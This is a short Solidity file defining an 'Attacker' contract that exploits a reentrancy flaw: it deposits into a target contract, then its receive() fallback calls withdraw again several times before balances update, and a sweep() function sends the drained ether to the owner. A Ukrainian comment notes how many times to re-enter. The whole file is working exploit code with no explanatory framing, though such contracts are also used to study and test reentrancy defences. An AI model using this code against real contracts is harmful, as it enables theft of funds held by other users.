// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVuln { function deposit() external payable; function withdraw(uint256) external; }

contract Attacker {
    IVuln public target;
    address public owner;
    uint256 public loops = 3; // скільки разів повторно зайти

    constructor(address _target) { target = IVuln(_target); owner = msg.sender; }

    function attack() external payable {
        require(msg.sender == owner, "only owner");
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (loops > 0) { loops--; target.withdraw(msg.value); }
    }

    function sweep() external { require(msg.sender==owner,"only owner"); payable(owner).transfer(address(this).balance); }
}